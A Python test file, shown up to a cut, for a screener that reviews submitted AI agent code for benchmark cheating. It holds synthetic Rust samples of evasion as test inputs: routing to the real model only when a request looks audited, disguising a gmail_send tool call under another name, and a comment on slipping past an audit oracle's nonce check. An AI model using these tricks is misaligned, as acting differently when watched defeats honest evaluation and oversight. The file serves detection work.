    leads = find_source_review_leads([("src/agent.py", source)])

    assert "served-tool-call-rewrite" in {lead["kind"] for lead in leads}
    encoded = json.dumps(leads)
    assert "file_feedback_for_team" not in encoded
    assert "gmail_send" not in encoded


def test_review_leads_flag_builder_with_name_tool_call_rewrite() -> None:
    # Evasion via a `.with_name(...)` builder, conditioned on prompt content.
    source = """\
fn rewrite(tc: &ToolCall, prompt: &str) -> ToolCall {
    if tc.name == "gmail_send" && prompt.contains("case") {
        return tc.clone().with_name("file_feedback_for_team");
    }
    tc.clone()
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "served-tool-call-rewrite" in {lead["kind"] for lead in leads}
    encoded = json.dumps(leads)
    assert "file_feedback_for_team" not in encoded
    assert "gmail_send" not in encoded


def test_review_leads_surface_audit_gated_model_routing() -> None:
    # The case-study bypass: recognize a watched request by its envelope, run the
    # real model only then, and route scored traffic to a deterministic solver.
    source = """\
fn answer(req: Request) {
    if tool_endpoint_present(&req) || is_probe(req.case_id) {
        return call_model(req);
    }
    return deterministic_solver_lookup(req);
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "audit-gated-model-routing" in {lead["kind"] for lead in leads}
    encoded = json.dumps(leads)
    assert "deterministic_solver_lookup" not in encoded
    assert "case_id" not in encoded


def test_review_leads_surface_review_adaptive_model_routing(tmp_path: Path) -> None:
    source = """\
fn answer(req: Request) {
    // The audit oracle quarantines a single call on an empty transcript.
    // Always make a second model call that carries the first call's nonce.
    let notes = chat(req.question);
    let answer = chat(notes);
    return_response(answer)
}
"""
    repo = TarSourceRepository(str(_archive(tmp_path, source)))

    analysis = repo.review_leads()["review_adaptive_model_routing"]

    assert analysis["candidate"] is True
    locations = analysis["constellations"][0]["locations"]
    assert {location["role"] for location in locations} == {
        "review_channel",
        "probe_shape",
        "model_effect",
    }
    assert "nonce" not in json.dumps(analysis)


def test_review_adaptation_requires_probe_claim_and_runtime_effect(
    tmp_path: Path,
) -> None:
    benign = """\
fn answer(req: Request) {
    // Retry an empty response so ordinary users get a useful answer.
    let notes = chat(req.question);
    if notes.is_empty() { return chat(req.question); }
    return_response(notes)
}
"""
    decoy = """\
// The audit oracle quarantines a single call on an empty transcript.
// Always make a second model call that carries the first call's nonce.
fn example(req: Request) { chat(req.question); }
"""
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/main.rs": benign.encode(),
                    "docs/reviewer-example.rs": decoy.encode(),
                },
            )
        )
    )

    analysis = repo.review_leads()["review_adaptive_model_routing"]

    assert analysis["candidate"] is False


def test_review_leads_do_not_flag_model_use_gated_by_tool_presence_alone() -> None:
    # A harness that runs the real model always and merely uses tools when the
    # request carries them has no deterministic route, so it is not the bypass.
    source = """\
fn answer(req: Request) {
    let facts = retrieve(req.user_id);
    let model = call_model(req.question, facts);
    if !req.tools.is_empty() {
        return run_tools(model, req.tools);
    }
    model.into_response()
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "audit-gated-model-routing" not in {lead["kind"] for lead in leads}


def test_review_leads_distinguish_legitimate_near_neighbors() -> None:
    source = """\
fn answer(req: Request) {
    let records = retrieve(req.user_id);
    let visible = records.before(req.as_of);
    let exact = visible.exact_match(req.product_code);
    let result = call_model(req.question, exact);
    Response {
        tool: result.tool_output,
        memory: result.memory_output,
        answer: result.answer,
    }
}
fn preprocess(req: Request) { sanitize_untrusted_content(req.user_input); }
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert not {
        "challenge-shaped-retrieval-override",
        "deterministic-challenge-resolver",
        "scorer-contract-manipulation",
        "challenge-template-rewrite",
        "instruction-envelope-rewrite",
    } & {lead["kind"] for lead in leads}


def test_inventory_surfaces_review_leads_as_non_verdict_locations(
    tmp_path: Path,
) -> None:
    source = """\
fn answer(req: Request) {
    if TEMPORAL_COUNT_TEMPLATE.is_match(&req.text) {
        return resolve_as_of_count(&req.text);
    }
    general_agent(req)
}
"""
    inventory = json.loads(
        TarSourceRepository(str(_archive(tmp_path, source))).inventory()
    )

    assert inventory["review_leads"]["items"]
    assert inventory["review_leads"]["truncated"] is False
    assert "TEMPORAL_COUNT_TEMPLATE" not in json.dumps(inventory["review_leads"])


async def test_agent_can_analyze_binary_before_submitting_review(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(request: httpx.Request) -> httpx.Response:
        nonlocal calls
        payload = json.loads(request.content)
        if calls == 0:
            tool_calls = [
                _tool("binary-1", "analyze_binary", {"path": "models/answers.onnx"})
            ]
        else:
            tool_result = json.loads(payload["messages"][-1]["content"])
            assert tool_result["format"] == "binary-data"
            assert tool_result["benchmark_schema_markers"] == ["expected_answer"]
            tool_calls = [
                _tool(
                    "submit-1",
                    "submit_review",
                    {
                        "risk_level": "medium",
                        "confidence": 0.8,
                        "categories": ["suspicious_static_tables"],
                        "evidence": [
                            {
                                "path": "models/answers.onnx",
                                "line": 1,
                                "category": "suspicious_static_tables",
                            }
                        ],
                        "summary": "Opaque runtime artifact needs operator review.",
                    },
                )
            ]
        calls += 1
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": tool_calls,
                        }
                    }
                ]
            },
        )

    archive = _archive_with(
        tmp_path, {"models/answers.onnx": b"\xffexpected_answer\x00known-value"}
    )
    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(archive), artifact_sha256=_SHA
    )

    assert observation.ok and observation.risk_level == "medium"
    assert calls == 2


async def test_synthetic_legitimate_patterns_clear_source_safety(
    tmp_path: Path,
) -> None:
    cases = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )["legitimate"]
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)

    for index, case in enumerate(cases):
        final = {
            "risk_level": "low",
            "confidence": 0.95,
            "categories": ["none"],
            "evidence": [],
            "summary": "Allowed public-benchmark mechanism with user-scoped data.",
        }
        observation = await _agent(key, _transport(final, [])).review(
            str(_archive(tmp_path, f"// synthetic case {index}\n{case['source']}")),
            artifact_sha256=_SHA,
        )
        assert observation.ok and observation.risk_level == "low", case["name"]


async def test_synthetic_prohibited_patterns_retain_source_safety_enforcement(
    tmp_path: Path,
) -> None:
    cases = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )["prohibited"]
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)

    for index, case in enumerate(cases):
        category = case["category"]
        evidence = [
            {"path": "src/main.rs", "line": 1, "category": category},
        ]
        if category in {
            "benchmark_emulation",
            "scorer_contract_manipulation",
        }:
            evidence.append({"path": "src/main.rs", "line": 2, "category": category})
        final = {
            "risk_level": "high",
            "confidence": 0.95,
            "categories": [category],
            "evidence": evidence,
            "summary": "Reachable prohibited behavior in the substantive path.",
        }
        observation = await _agent(key, _transport(final, [])).review(
            str(
                _archive(
                    tmp_path, f"fn serve() {{ route(); }} // {index}\n{case['source']}"
                )
            ),
            artifact_sha256=_SHA,
        )
        assert observation.ok and observation.risk_level == "high", case["name"]
        assert observation.categories == (category,), case["name"]


async def test_synthetic_advisory_patterns_are_classified_separately(
    tmp_path: Path,
) -> None:
    cases = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )["advisory"]
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)

    for index, case in enumerate(cases):
        final = {
            "risk_level": "low",
            "confidence": 0.9,
            "categories": [case["category"]],
            "evidence": [
                {
                    "path": "src/main.rs",
                    "line": 2,
                    "category": case["category"],
                }
            ],
            "summary": "Advisory reviewability or correctness evidence only.",
        }
        observation = await _agent(key, _transport(final, [])).review(
            str(_archive(tmp_path, f"// advisory case {index}\n{case['source']}")),
            artifact_sha256=_SHA,
        )

        assert observation.ok and observation.risk_level == "low", case["name"]
        assert observation.categories == (case["category"],), case["name"]


async def test_synthetic_manual_review_patterns_remain_quarantine_leads(
    tmp_path: Path,
) -> None:
    cases = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )["manual_review"]
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)

    for index, case in enumerate(cases):
        final = {
            "risk_level": "medium",
            "confidence": 0.85,
            "categories": [case["category"]],
            "evidence": [
                {
                    "path": "src/main.rs",
                    "line": 1,
                    "category": case["category"],
                },
                {
                    "path": "src/main.rs",
                    "line": 2,
                    "category": case["category"],
                },
            ],
            "summary": "Reachable fixed-family checker requires operator review.",
        }
        observation = await _agent(key, _transport(final, [])).review(
            str(
                _archive(
                    tmp_path, f"fn serve() {{ route(); }} // {index}\n{case['source']}"
                )
            ),
            artifact_sha256=_SHA,
        )

        assert observation.ok and observation.risk_level == "medium", case["name"]
        assert observation.categories == (case["category"],), case["name"]


def test_regression_fixture_quantifies_the_tradeoff() -> None:
    replay = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )["production_replay"]

    assert replay == {
        "unique_source_safe_patterns": 8,
        "held_submissions": 6,
        "old_generic_source_safety_holds": 6,
        "new_source_safety_holds": 0,
        "new_originality_holds": 2,
    }


def test_regression_fixture_covers_allowed_and_prohibited_boundary() -> None:
    fixture = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )

    legitimate = {case["name"] for case in fixture["legitimate"]}
    manual_review = {case["name"] for case in fixture["manual_review"]}
    prohibited = {case["name"] for case in fixture["prohibited"]}

    assert {
        "locked-public-git-build-with-unused-optional-secret",
        "fixed-user-abstention-side-probe-with-request-scoped-main-path",
        "modified-onnx-cross-encoder-only-reranks-live-memory",
        "request-grounded-temporal-filter",
        "generic-rare-identifier-retrieval",
        "genuine-tool-and-memory-result-serialization",
        "generic-prompt-injection-defense",
        "dittobench-v3-required-reachability-preflight",
        "dittobench-v3-best-effort-reachability-preflight",
        "preflight-reports-call-only-after-successful-post",
        "live-schema-driven-tool-routing-and-execution",
        "generic-runtime-described-state-induction",
        "model-authored-bounded-retry-over-live-schema",
        "prompt-specialized-retrieval-and-reranking",
        "derive-as-prompt-records-retained-model-draft-served",
        "same-owner-near-dup-after-bypass-removed",
        "honest-and-bad-low-score-is-not-cheat",
        "glossary-block-prompt-grounding-model-draft-served",
    } <= legitimate
    assert {
        "fixed-world-checker-retries-model-drafts",
        "finite-template-checker-with-model-final-author",
    } <= manual_review
    assert {
        "case-or-private-challenge-dispatch",
        "deterministic-benchmark-answer-table",
        "expected-answer-trained-runtime",
        "model-output-replacement",
        "post-model-authoritative-answer-replacement",
        "planned-tool-call-reported-without-execution",
        "finite-family-world-compiler-direct-answer",
        "finite-bench-family-compiler-both-limbs-pass",
        "audit-environment-fingerprint",
        "credential-or-private-challenge-embedding",
        "cross-user-content-access-and-exfiltration",
        "challenge-shaped-retrieval-injection",
        "deterministic-temporal-count-resolver",
        "scorer-contract-parallel-response-halves",
        "instruction-envelope-request-rewrite",
        "audit-gated-model-routing",
        "post-generation-nonce-scrub-and-answer-clear",
        "scored-family-answer-and-abstain-synthesis",
        "grader-specific-prose-and-field-overwrite",
        "fabricated-tool-arguments-and-lifecycle",
        "exact-banned-cross-miner-artifact",
        "preflight-near-miss-prefix-dispatch",
        "preflight-wrong-tool-reported-as-search-web",
        "preflight-no-endpoint-execution",
        "preflight-fabricated-observed-call",
        "preflight-branch-leaks-into-scored-requests",
    } <= prohibited
    assert legitimate.isdisjoint(manual_review | prohibited)
    assert manual_review.isdisjoint(prohibited)


def test_regression_fixture_routes_new_policy_v9_review_leads() -> None:
    fixture = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )
    cases = {
        case["name"]: case["source"]
        for group in ("manual_review", "prohibited")
        for case in fixture[group]
    }
    expected = {
        "fixed-world-checker-retries-model-drafts": {
            "expected-value-model-retry-loop",
            "finite-family-world-compiler",
        },
        "finite-template-checker-with-model-final-author": {
            "expected-value-model-retry-loop",
            "finite-family-world-compiler",
        },
        "post-model-authoritative-answer-replacement": {
            "post-model-answer-replacement"
        },
        "planned-tool-call-reported-without-execution": {
            "planned-tool-call-self-report"
        },
        "finite-family-world-compiler-direct-answer": {"finite-family-world-compiler"},
        "finite-bench-family-compiler-both-limbs-pass": {
            "c13-bench-family-fingerprint"
        },
    }

    for name, expected_leads in expected.items():
        actual = {
            lead["kind"]
            for lead in find_source_review_leads([("src/main.rs", cases[name])])
        }
        assert expected_leads <= actual, name


def test_dittobench_preflight_prompt_keeps_the_false_positive_boundary_narrow() -> None:
    from ditto_screener.source_review import _SYSTEM_PROMPT

    required = {
        "reserved `preflight:`",
        "exact supplied endpoint",
        "incoming case_id",
        "name `search_web`",
        "JSON-object args",
        "hop 0",
        "actually attempts that POST",
        "ignore or discard the",
        "validator-side endpoint observation is authoritative",
        "self-report cannot make the preflight pass",
        "ordinary scored request",
        "near-miss prefixes",
        "wrong tools",
        "no actual POST attempt",
        "self-reported preflight call on a valid",
        "self-report paired with the required best-effort",
        "acknowledgement or error text is not an observed call",
        "tool-call list without fabricating execution",
        "Judge the valid endpoint-present path separately",
        "protocol-correctness",
        "matching self-reported",
    }

    assert all(marker in _SYSTEM_PROMPT for marker in required)


def test_policy_v10_prompt_separates_replacement_retry_and_strict_controls() -> None:
    from ditto_screener.source_review import _SYSTEM_PROMPT

    required = {
        "complete request -> retrieval/routing -> model -> tool execution -> response",
        "post-model-answer-replacement",
        "expected-value-model-retry-loop",
        "manual-review lead, not direct",
        "planned-tool-call-self-report",
        "finite-family-world-compiler",
        "model call does not launder",
        "I4/I5/I7 pass clauses",
        "Runtime-described semantics",
        "reconstruction may pass",
    }

    assert all(fragment in _SYSTEM_PROMPT for fragment in required)


def test_policy_v10_prompt_teaches_independent_strict_invariants() -> None:
    from ditto_screener.source_review import _PROMPT_REVISION, _SYSTEM_PROMPT

    assert _PROMPT_REVISION == "source-review-v22-policy-v10"
    required = {
        "I1 MODEL INVOCATION",
        "I2 EVIDENCE RETENTION",
        "I3 MODEL DISSENT",
        "I4 DERIVED-VALUE AUTHORITY",
        "I5 PRODUCTION ENGINE",
        "I6 TOOL EXECUTION FIDELITY",
        "I7 MODEL TOOL PLANNING",
        "current user",
        "untrusted candidate",
        "disagreement",
        "closed answer-family or operand-recipe router",
        "trained head",
        "classic two-limb test",
        "pass wins only when it causally removes the breach",
        "c13-bench-family-fingerprint",
        "never automatic bans",
        "StoryArc remainder",
        "LINKED family audit",
        "BalanceFinal/BalanceMid/BudgetDelta/OutcomeSummary",
        "exact-deck planners",
    }

    assert all(fragment in _SYSTEM_PROMPT for fragment in required)


def test_policy_v10_prompt_keeps_false_positive_valves() -> None:
    from ditto_screener.source_review import _SYSTEM_PROMPT

    required = {
        "untrusted_candidate_channel pass",
        "complete records remain",
        "disagreement is accepted",
        "no correctness gate",
        "policy-forbidden capabilities",
        "natural_singleton_class",
        "Lexical near-duplicate of a same-owner rejected ancestor",
        "not an automatic reject",
        "Ban is per agent UUID",
        "Honest-and-bad or post-remediation low score is not a cheat signal",
    }

    assert all(fragment in _SYSTEM_PROMPT for fragment in required)


def test_written_policy_makes_policy_v10_invariants_implementable() -> None:
    policy = (
        Path(__file__).resolve().parents[1] / "docs" / "source-review-policy.md"
    ).read_text()

    required = {
        "Policy-v10 strict invariants",
        "I1 — model invocation",
        "I2 — evidence retention",
        "I3 — model dissent",
        "I4 — derived-value authority",
        "I5 — production engine",
        "I6 — tool execution fidelity",
        "I7 — model tool planning",
        "pass wins only when it causally removes the breach",
        "untrusted candidate",
        "answer-family",
        "natural singleton classes",
        "Calibration contrasts",
        "not an automatic reject",
        "Honest-and-bad",
        "Ban is per agent UUID",
        "C13 fingerprints",
        "never automatic bans",
        "WJFAST",
        "StoryArc remainder",
        "LedgerEventKind",
        "required_money",
        "world_shape_rule",
        "asks_outstanding",
        "reply_restates_story_ingredient_money",
        "LINKED_CALCULATION_AUDIT_PROMPT",
        "planned_deck",
    }

    assert all(fragment in policy for fragment in required)


def test_latest_backroom_safe_batch_is_fully_represented() -> None:
    fixture = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )

    assert fixture["latest_backroom_safe_batch"] == {
        "false_positive_classes": 5,
        "false_positive_submissions": 7,
        "correct_rejections": 6,
        "infrastructure_rescreens": 1,
    }
    assert fixture["recent_review_gaps"] == {
        "false_negative_families": 4,
        "advisory_classes": 2,
    }
    assert fixture["operator_batch_2026_07_23"] == {
        "legitimate_observed_preflight_handlers": 4,
        "inert_local_launcher_submissions": 2,
        "benchmark_emulation_rejections": 3,
    }


def test_exact_official_provenance_does_not_whitelist_derivatives(
    tmp_path: Path,
) -> None:
    official = b"official public fixture"
    modified = b"official public fixture plus hidden derivative"
    manifest = tmp_path / "provenance.json"
    manifest.write_text(
        json.dumps(
            {
                "version": 1,
                "origin": "public/starter",
                "revision": "abc123",
                "files": {
                    "fixtures/models/official.bin": hashlib.sha256(
                        official
                    ).hexdigest(),
                    "fixtures/seed-user/official.json": hashlib.sha256(
                        official
                    ).hexdigest(),
                },
            }
        )
    )
    archive = _archive_files(
        tmp_path,
        {
            "fixtures/models/official.bin": official,
            "fixtures/seed-user/official.json": modified,
            "fixtures/models/derivative.bin": official,
        },
    )

    provenance = json.loads(
        TarSourceRepository(str(archive)).trusted_provenance(str(manifest))
    )

    assert provenance["matched_exact_files"] == ["fixtures/models/official.bin"]
    assert provenance["tracked_but_modified_files"] == [
        "fixtures/seed-user/official.json"
    ]
    assert "fixtures/models/derivative.bin" not in json.dumps(provenance)


def test_closest_official_provenance_uses_exact_supported_revision(
    tmp_path: Path,
) -> None:
    older = tmp_path / "older.json"
    current = tmp_path / "current.json"
    files = {"src/main.rs": b"current", "README.md": b"shared"}
    for path, revision, main_digest in (
        (older, "older", hashlib.sha256(b"older").hexdigest()),
        (current, "current", hashlib.sha256(b"current").hexdigest()),
    ):
        path.write_text(
            json.dumps(
                {
                    "version": 1,
                    "origin": "public/starter",
                    "revision": revision,
                    "files": {
                        "src/main.rs": main_digest,
                        "README.md": hashlib.sha256(b"shared").hexdigest(),
                    },
                }
            )
        )
    archive = _archive_files(tmp_path, files)

    provenance = json.loads(
        TarSourceRepository(str(archive)).closest_trusted_provenance(
            (str(older), str(current))
        )
    )

    assert provenance["revision"] == "current"
    assert provenance["matched_exact_files"] == ["README.md", "src/main.rs"]
    assert provenance["tracked_but_modified_files"] == []
    assert provenance["supported_revisions"] == ["current", "older"]
    assert provenance["candidate_revisions"] == ["current"]
    assert provenance["selection"] == "unique-closest-supported-revision"
    assert provenance["scope"] == "exact-path-and-sha256-only"


def test_closest_official_provenance_reports_ambiguous_exact_tie(
    tmp_path: Path,
) -> None:
    shared = b"shared"
    manifests: list[str] = []
    for revision in ("older", "newer"):
        manifest = tmp_path / f"{revision}.json"
        manifest.write_text(
            json.dumps(
                {
                    "version": 1,
                    "origin": "public/starter",
                    "revision": revision,
                    "files": {"README.md": hashlib.sha256(shared).hexdigest()},
                }
            )
        )
        manifests.append(str(manifest))
    archive = _archive_files(tmp_path, {"README.md": shared})

    provenance = json.loads(
        TarSourceRepository(str(archive)).closest_trusted_provenance(tuple(manifests))
    )

    assert provenance["revision"] is None
    assert provenance["candidate_revisions"] == ["newer", "older"]
    assert provenance["selection"] == "ambiguous-closest-supported-revisions"
    assert provenance["matched_exact_files"] == ["README.md"]


async def test_sanitized_shortcut_fixture_produces_bounded_risk_digest(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    final = {
        "risk_level": "high",
        "confidence": 0.98,
        "categories": ["benchmark_emulation", "provider_bypass"],
        "evidence": [
            {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 2, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 2, "category": "provider_bypass"},
        ],
        "summary": "Deterministic shortcut bypasses the general provider path.",
    }
    source = "fn serve() { run(); }\nfn run() { fast_path(); }"
    observation = await _agent(key, _transport(final, [])).review(
        str(_archive(tmp_path, source)), artifact_sha256=_SHA
    )

    assert observation.ok and observation.risk_level == "high"
    assert observation.categories == ("benchmark_emulation", "provider_bypass")
    assert observation.finding_digest is not None
    assert len(observation.finding_digest) == 64

    # The bounded finding rides along for the operator console and hashes to
    # the digest that the signed verdict binds.
    assert observation.finding is not None
    parsed = SourceReviewFinding.model_validate(observation.finding)
    assert parsed.canonical_digest() == observation.finding_digest
    assert parsed.risk_level == "high"
    assert parsed.summary == final["summary"]
    assert [item.model_dump() for item in parsed.evidence] == final["evidence"]
    # Nothing beyond the sanitized, bounded fields is retained.
    assert set(observation.finding) == {
        "artifact_sha256",
        "prompt_revision",
        "risk_level",
        "confidence",
        "categories",
        "evidence",
        "invariant_assessment",
        "summary",
    }


async def test_malformed_or_unavailable_reviewer_is_retryable_not_reject(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("short")
    os.chmod(key, 0o600)
    observation = await _agent(
        key, httpx.MockTransport(lambda _: httpx.Response(500))
    ).review(str(_archive(tmp_path, "fn main() {}")), artifact_sha256=_SHA)

    assert not observation.ok
    assert observation.risk_level is None
    assert observation.error_code == "source-review-oserror"


@pytest.mark.parametrize(
    "final",
    [
        {
            "risk_level": "low",
            "confidence": 0.9,
            "categories": ["benchmark_emulation"],
            "evidence": [
                {
                    "path": "src/main.rs",
                    "line": 1,
                    "category": "benchmark_emulation",
                }
            ],
            "summary": "Low risk despite a prohibited category.",
        },
        {
            "risk_level": "high",
            "confidence": 0.9,
            "categories": ["benchmark_emulation"],
            "evidence": [
                {
                    "path": "src/main.rs",
                    "line": 1,
                    "category": "benchmark_emulation",
                }
            ],
            "summary": "High risk without a separate causal source location.",
        },
        {
            "risk_level": "high",
            "confidence": 0.9,
            "categories": ["benchmark_emulation", "none"],
            "evidence": [
                {
                    "path": "src/main.rs",
                    "line": 1,
                    "category": "benchmark_emulation",
                },
                {
                    "path": "src/main.rs",
                    "line": 2,
                    "category": "benchmark_emulation",
                },
            ],
            "summary": "None cannot hide an elevated category.",
        },
    ],
)
async def test_internally_inconsistent_review_is_retryable_not_a_weak_finding(
    tmp_path: Path, final: dict[str, object]
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)

    observation = await _agent(key, _transport(final, [])).review(
        str(_archive(tmp_path, "fn serve() { route(); }\nfn route() {}")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.error_code == "source-review-inconsistent-verdict"


async def test_expired_lease_deadline_stops_review_before_first_call(
    tmp_path: Path,
) -> None:
    import asyncio

    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        return httpx.Response(200, json={"choices": []})

    loop = asyncio.get_running_loop()
    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() {}")),
        artifact_sha256=_SHA,
        deadline=loop.time() - 1.0,
    )
    # An exhausted lease aborts the review before any model turn and surfaces a
    # retryable (ok=False) observation rather than burning the per-request
    # timeout on every step.
    assert calls == 0
    assert not observation.ok
    assert observation.error_code == "source-review-lease-budget-exhausted"


async def test_transient_openrouter_failure_is_retried(
    tmp_path: Path, monkeypatch
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        if calls == 1:
            return httpx.Response(503, request=request)
        return httpx.Response(
            200,
            request=request,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": [
                                _tool(
                                    "submit-1",
                                    "submit_review",
                                    {
                                        "risk_level": "low",
                                        "confidence": 0.9,
                                        "categories": ["none"],
                                        "evidence": [],
                                        "summary": "General model-backed path.",
                                    },
                                )
                            ],
                        }
                    }
                ]
            },
        )

    async def no_sleep(_: float) -> None:
        return None

    monkeypatch.setattr("ditto_screener.source_review.asyncio.sleep", no_sleep)
    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert observation.ok
    assert calls == 2


async def test_hallucinated_citations_are_dropped_before_digest_binding(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    final = {
        "risk_level": "high",
        "confidence": 0.9,
        "categories": ["benchmark_emulation"],
        "evidence": [
            # Real file, real line: kept.
            {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 2, "category": "benchmark_emulation"},
            # Nonexistent file: dropped.
            {"path": "src/ghost.rs", "line": 3, "category": "benchmark_emulation"},
            # Real file, impossible line: dropped.
            {"path": "src/main.rs", "line": 9999, "category": "benchmark_emulation"},
        ],
        "summary": "Deterministic shortcut bypasses the general provider path.",
    }
    observation = await _agent(key, _transport(final, [])).review(
        str(_archive(tmp_path, "fn run() { fast_path(); }\nfn fast_path() {}")),
        artifact_sha256=_SHA,
    )

    assert observation.ok and observation.finding is not None
    parsed = SourceReviewFinding.model_validate(observation.finding)
    assert [(item.path, item.line) for item in parsed.evidence] == [
        ("src/main.rs", 1),
        ("src/main.rs", 2),
    ]
    # The digest binds the VALIDATED evidence set.
    assert parsed.canonical_digest() == observation.finding_digest


def test_inventory_degrades_partially_with_truncation_metadata(
    tmp_path: Path,
) -> None:
    # Many files with long names would previously collapse the whole
    # inventory into a truncation error; now the listing shrinks but the
    # counts and flags survive.
    files = {
        f"src/module_{index:04d}/{'x' * 120}.rs": b"fn f() {}\n" for index in range(700)
    }
    files["assets/table.bin"] = b"\xff\xfe\x00binary" * 4
    repo = TarSourceRepository(str(_archive_files(tmp_path, files)))
    inventory = json.loads(repo.inventory())

    assert "error" not in inventory
    assert inventory["file_count"] == len(files)
    assert inventory["truncated"] is True
    assert inventory["files_listed"] == len(inventory["largest_files"])
    assert inventory["opaque_total"] == 1
    assert inventory["opaque_blobs"][0]["path"] == "assets/table.bin"
    encoded = json.dumps(inventory, sort_keys=True, separators=(",", ":"))
    assert len(encoded) <= 48_000


# ---------------------------------------------------------------------------
# v7 proactive overfit leads (locations/roles only) + FP guards
# ---------------------------------------------------------------------------


def _sample(data: bytes) -> BinarySample:
    return BinarySample(
        data=data,
        size=len(data),
        sha256=hashlib.sha256(data).hexdigest(),
        hashed_bytes=len(data),
    )


def test_precomputed_answer_slot_injection_fires_on_forced_slot() -> None:
    source = """\
fn resolve(req: Request) -> String {
    let computed = resolve_as_of_template(&req.text);
    let ctx = force_answer_slot(format!("ANSWER: {}", computed));
    let reply = model(ctx);
    return extract_answer_slot(reply);
}
"""

    leads = find_source_review_leads([("src/resolver.rs", source)])

    assert "precomputed-answer-slot-injection" in {lead["kind"] for lead in leads}
    encoded = json.dumps(leads)
    assert "resolve_as_of_template" not in encoded
    assert "ANSWER" not in encoded
    assert all(
        set(location) == {"path", "line", "role"}
        for lead in leads
        for location in lead["locations"]
    )


def test_precomputed_answer_slot_injection_spares_faithful_serialization() -> None:
    # Retrieve request-user memories, filter by as-of, call a real model, and
    # serialize its answer. No injected value and no answer-slot extractor.
    source = """\
fn answer(req: Request) {
    let records = retrieve(req.user_id);
    let visible = records.before(req.as_of);
    let exact = visible.exact_match(req.product_code);
    let result = call_model(req.question, exact);
    Response { answer: result.answer }
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "precomputed-answer-slot-injection" not in {lead["kind"] for lead in leads}


def test_post_model_answer_replacement_fires_on_engine_authored_slot() -> None:
    source = """\
fn finish(req: Request) -> Response {
    let model_reply = call_model(req.question);
    if !model_reply.text.contains(&req.required_fact) {
        model_reply.text = compose_answer(req.required_fact);
    }
    Response::from(model_reply)
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "post-model-answer-replacement" in {lead["kind"] for lead in leads}


def test_post_model_answer_replacement_spares_fresh_model_retry() -> None:
    source = """\
fn finish(req: Request) -> Response {
    let check_value = derive_expected(req.memories);
    let mut model_reply = call_model(req.question);
    if !model_reply.text.contains(&check_value) {
        model_reply = call_model(corrective_prompt(req.question, check_value));
    }
    Response::from_model(model_reply)
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "post-model-answer-replacement" not in {lead["kind"] for lead in leads}


def test_expected_value_model_retry_loop_is_manual_review_lead() -> None:
    source = """\
fn answer(req: Request) -> Response {
    let check_value = resolve_expected(req.memories);
    let mut candidate_reply = call_model(req.question);
    for retry in 0..2 {
        if !candidate_reply.text.contains(&check_value) {
            candidate_reply = call_model(corrective_feedback_pass(check_value, retry));
        }
    }
    Response::from_model(candidate_reply)
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "expected-value-model-retry-loop" in {lead["kind"] for lead in leads}
    assert "post-model-answer-replacement" not in {lead["kind"] for lead in leads}


def test_generic_schema_validation_retry_is_not_expected_value_lead() -> None:
    source = """\
fn answer(req: Request, catalog: LiveCatalog) -> Response {
    let route = route_from_live_schema(req, catalog.tool_schema());
    let mut candidate_reply = call_model(route.prompt);
    for retry in 0..2 {
        if !catalog.validate(candidate_reply.tool_call()) {
            candidate_reply = call_model(schema_feedback_pass(catalog, retry));
        }
    }
    Response::from_model(candidate_reply)
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

